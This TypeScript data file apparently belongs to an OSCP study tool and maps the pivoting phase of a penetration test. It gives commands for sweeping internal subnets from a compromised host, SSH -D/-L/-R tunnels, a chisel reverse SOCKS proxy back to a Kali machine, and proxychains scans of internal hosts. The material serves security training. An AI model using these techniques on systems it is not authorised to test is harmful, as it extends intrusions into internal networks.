import type { OscpContent } from '@/types/oscp'

/** Phase: port redirection, tunnelling and pivoting to reach internal hosts. */
const pivoting: OscpContent = {
    nodes: [
        {
            id: 'pivot-discovery',
            title: 'Internal subnet reachable',
            type: 'finding',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'Your compromised host has a second NIC or can reach hosts you cannot. Route through it: a SOCKS proxy for tooling, or single-port forwards for one service.',
            commands: [
                {
                    label: 'Spot the pivot',
                    code: `ip a; arp -a; route -n            # Linux
ipconfig /all; route print       # Windows
# quick internal sweep from the host:
for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i | grep from &); done`,
                },
            ],
            tags: ['pivot', 'dual-homed', 'subnet', 'internal'],
        },
        {
            id: 'ssh-dynamic-socks',
            title: 'SSH dynamic SOCKS (-D)',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'The default pivot when you have SSH creds on the compromised host. One SOCKS proxy tunnels all your tools through it via proxychains.',
            commands: [
                {
                    label: 'Open the proxy',
                    code: 'ssh -D 1080 -N <user>@<pivot>   # then use proxychains',
                },
            ],
            tags: ['ssh', 'socks', 'dynamic', '-D'],
        },
        {
            id: 'ssh-local-forward',
            title: 'SSH local forward (-L)',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'Expose one internal service on your loopback. Good for hitting a single port (a DB, a web admin) without a full proxy.',
            commands: [
                {
                    label: 'Forward one port',
                    code: 'ssh -L 8000:10.10.10.5:80 -N <user>@<pivot>   # http://127.0.0.1:8000',
                },
            ],
            tags: ['ssh', '-L', 'local-forward'],
        },
        {
            id: 'ssh-remote-forward',
            title: 'SSH remote forward (-R)',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'When the pivot cannot receive an inbound SSH connection, connect FROM the pivot back to Kali and forward a port through that tunnel. Pairs with a Kali sshd.',
            commands: [
                {
                    label: 'Reverse the tunnel',
                    code: 'ssh -R 1080 -N kali@<kali-ip>   # dynamic reverse SOCKS on Kali:1080',
                },
            ],
            tags: ['ssh', '-R', 'remote-forward', 'reverse'],
        },
        {
            id: 'chisel',
            title: 'chisel tunnel',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'When there is no SSH (typically a Windows pivot). Run a chisel server on Kali and a client on the target for a reverse SOCKS proxy over HTTP.',
            commands: [
                {
                    label: 'Reverse SOCKS',
                    code: `# Kali:
./chisel server -p 8080 --reverse
# target:
chisel.exe client <kali-ip>:8080 R:socks`,
                },
            ],
            tags: ['chisel', 'socks', 'windows', 'http-tunnel'],
        },
        {
            id: 'proxychains',
            title: 'Run tools through the proxy',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'Point proxychains at your SOCKS port, then prefix any TCP tool. Use -sT nmap (no SYN through SOCKS) and expect it to be slow.',
            commands: [
                {
                    label: 'Configure + use',
                    code: `echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
proxychains -q nmap -sT -Pn -p 445,3389,5985 10.10.10.5
proxychains -q netexec smb 10.10.10.0/24`,
                },
            ],
            tags: ['proxychains', 'socks', 'nmap', 'netexec'],
        },
    ],
    edges: [
        { from: 'foothold-linux', to: 'pivot-discovery', label: 'second NIC / new subnet' },
        { from: 'foothold-windows', to: 'pivot-discovery', label: 'second NIC / new subnet' },
        { from: 'root-linux', to: 'pivot-discovery', label: 'reach deeper hosts' },
        { from: 'system-windows', to: 'pivot-discovery', label: 'reach deeper hosts' },
        { from: 'pivot-discovery', to: 'ssh-dynamic-socks', label: 'have SSH on the pivot' },
        { from: 'pivot-discovery', to: 'ssh-local-forward', label: 'need one port only' },
        { from: 'pivot-discovery', to: 'ssh-remote-forward', label: 'no inbound to pivot' },
        { from: 'pivot-discovery', to: 'chisel', label: 'no SSH (Windows)' },
        { from: 'ssh-dynamic-socks', to: 'proxychains', label: 'SOCKS up' },
        { from: 'ssh-remote-forward', to: 'proxychains', label: 'SOCKS up' },
        { from: 'chisel', to: 'proxychains', label: 'SOCKS up' },
        { from: 'proxychains', to: 'smb-enum', label: 'enumerate the internal host' },
        { from: 'proxychains', to: 'ad-null-enum', label: 'internal DC reachable' },
    ],
}

export default pivoting
